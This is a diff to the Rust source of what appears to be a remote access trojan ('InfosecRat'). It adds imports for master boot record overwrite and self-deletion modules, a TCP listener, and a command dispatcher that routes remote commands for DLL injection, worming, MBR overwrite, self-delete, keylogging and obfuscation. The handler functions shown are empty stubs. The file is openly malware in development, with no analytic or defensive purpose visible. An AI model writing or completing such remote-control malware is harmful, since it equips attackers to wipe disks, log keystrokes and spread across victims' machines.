@@ -4,11 +4,15 @@ mod dllinjection;
 mod BasicCryptoAlgos;
 mod maliciousScripts;
 mod AntiDebugChecks;
+mod MayDay;
 
 
 // use keylogger::keylogger::keylog;
 // use helper_fns::mem_alloc::mem_alloc;
 use dllinjection::injector::inject_dll;
+use MayDay::self_delete::{self_del, NULL};
+use MayDay::mbr_overwrite::mbr;
+use winapi::shared::windot11::PDOT11_PORT_STATE_NOTIFICATION;
 use std::env::args;
 use std::process::exit;
 // use BasicCryptoAlgos::aes_exec::aes_execute;
@@ -42,10 +46,85 @@ impl ULARGE_INTEGER{
     }
 
     }
+fn connect()->io::Result<()>{
+    println!("Starting listening.....");
 
+    let listener = TcpListener::bind((ADDR,PORT))?;
+    println!("Listening....");
 
+    for stream in listener.incoming(){
+        match stream {
+            Ok(stream) => {
+                println!("Connected print in hiding");
+                if let Err(e) = handle_commands(stream){
+                    eprintln!("Error handling connection: {}",e);
+                }
+            }
+            Err(e) =>{
+                eprintln!("Error handled!!");
+            }
+        }
+    }
+    Ok(())
+}
+fn handle_dll_injection(){
+
+}
+fn handle_mbr_overwrite(){
+
+}
+fn handle_worming(){
+
+}
+
+fn handle_self_delete(){
+
+}
+fn handle_keylogger(){
+
+}
+fn handle_obfuscation(){
+
+}
+fn handle_scripts(){
+
+}
+fn handle_commands(mut stream:TcpStream) -> io::Result<()>{
+    let message = "Hello connection is successsful broooooo..";
+    stream.write_all(message.as_bytes());
+    println!("Sent the message....");
+    let mut received_msg = String::new();
+    stream.read_to_string(&mut received_msg);
+    println!("Received: {:?}",received_msg);
+    match received_msg.as_str(){ //as_str() function converts the String into &str
+        "close" =>{println!("closing the connection");
+                                    exit(0);},
+        "dll inject" => {
+            handle_dll_injection();}
+        "start worming" => {
+            handle_worming();
+        }
+        "mayday mbr overwrite" => {
+            handle_mbr_overwrite();
+        }
+        "mayday self delete" =>{
+            handle_self_delete();
+        }
+        "start keylogger" => {
+            handle_keylogger();
+        }
+        "obfuscate" => {
+            handle_obfuscation();
+        }
+        "run script" => {
+            handle_scripts();
+        }
+        _ => eprintln!("Error")
+    }
+    Ok(())
+
+}
 fn main(){
-    let cmd_args: Vec<String> = args().collect();
     //The collect function or method gives us the collected set of any iterable struct converted to another type just like join in python
     // if cmd_args.len()<=2{
     //     eprintln!("Usage ./InfosecRat.exe <processWindowName> <dllPath>");
@@ -66,28 +145,7 @@ fn main(){
     );
 
     //Work area
-    println!("Hello client");
-
-
-    if let Ok(mut stream) = TcpStream::connect(SocketAddrV4::new(ADDR,PORT)){
-        println!("Connected to the server {:?}",stream.peer_addr().unwrap());
-loop{
-        let mut message = String::new();
-        io::stdin().read_line(&mut message);
-        match message.as_str(){
-            "#END#" => stream.shutdown(Shutdown::Both).expect("Shutdown Failed!!"),
-            _ => {
-                println!("Sent the message..");
-                stream.write(&message.into_bytes());
-                //this is for writing to the stream.
-                //The one that writes will send and the one that reads will always receive.
-            }
-        }
-    }
-    }
-    else{
-        println!("Could not connect to the server!!");
-    }
+    
 
 
     asm!(
